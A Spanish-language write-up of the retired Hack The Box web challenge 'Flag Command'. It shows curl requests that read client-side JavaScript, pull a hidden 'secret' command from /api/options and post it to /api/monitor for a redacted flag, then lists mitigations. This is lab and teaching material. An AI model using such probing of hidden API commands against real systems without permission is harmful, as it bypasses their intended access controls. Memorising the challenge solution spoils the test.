---
challenge: Flag Command
type: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, api, javascript, information-disclosure, client-side]
---

# Flag Command — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

«Dimensional Escape Quest»: una terminal que parece un juego de aventuras, pero toda la lógica está en el cliente. Los tres ficheros JS (`commands.js`, `main.js`, `game.js`) revelan que existe una lista `availableOptions['secret']`, y la API `GET /api/options` devuelve el JSON completo con el comando secreto. Al enviarlo se recibe la flag.

## Enunciado y superficie

Terminal en el navegador con comandos (`start`, `help`, `clear`…). El juego siempre termina en derrota: ninguna combinación de opciones normales lleva a la victoria.

## Reconocimiento

En el HTML hay tres scripts: `commands.js`, `main.js` y `game.js`. `main.js` decide qué comandos valen y llama a `/api/monitor`; al cargar, pide `/api/options` y guarda la respuesta en `availableOptions`.

## Análisis del código

La comprobación es `availableOptions[currentStep].includes(cmd) || availableOptions['secret'].includes(cmd)`. Es decir: existe una lista `secret` que no se muestra en la interfaz y que el servidor acepta como comando válido.

## Explicación del fallo

Se revisa el tráfico y el código:

```bash
curl -s http://<IP>:<puerto>/ | grep -o 'src="[^"]*"'
```

```text
/static/terminal/js/commands.js
/static/terminal/js/main.js
/static/terminal/js/game.js
```

En `main.js` está la comprobación clave:

```js
if (availableOptions[currentStep].includes(currentCommand) ||
    availableOptions['secret'].includes(currentCommand)) {
```

Ese `availableOptions['secret']` solo se rellena con la respuesta de la API:

```bash
curl -s http://<IP>:<puerto>/api/options
```

```json
{"commands": ["start","help","clear", {"secret": ["Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"]}]}
```

## Reproducción local

El reto se sirve como contenedor; se puede levantar en local y repetir el `GET /api/options` y el `POST /api/monitor` contra `127.0.0.1`.

## Explotación

Se envía el comando secreto, que el servidor acepta como válido en el endpoint de monitorización:

```bash
curl -s -X POST http://<IP>:<puerto>/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

```text
HTB{<flag>}
```

La flag también aparece en la respuesta de la petición `monitor` en la pestaña de red, que es donde se puede copiar.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Frase exacta**: tiene que ser idéntica, con la puntuación y las mayúsculas del JSON.
- **CORS**: si el POST falla desde fuera del navegador, hacerlo desde la consola del propio sitio.
- **Ficheros JS**: los nombres cambian entre despliegues; buscar `api/options` en todos.

- Un juego «cliente» que decide qué comandos acepta no es un juego: es lógica que se puede leer.
- Los listados de opciones «ocultas» en una API son funcionalidad no documentada, no un secreto.
- Mitigación: validar en el servidor contra una allowlist por estado del juego y no enviar metadatos innecesarios al cliente.

## Mitigaciones y detección

- No enviar al cliente listas de comandos que el servidor no necesita: el catálogo entero es un mapa del juego.
- Validar en servidor contra el estado real de la partida, no contra una lista que el cliente ya conoce.
- Detección: peticiones a endpoints de opciones seguidas de comandos que no aparecen en la interfaz.
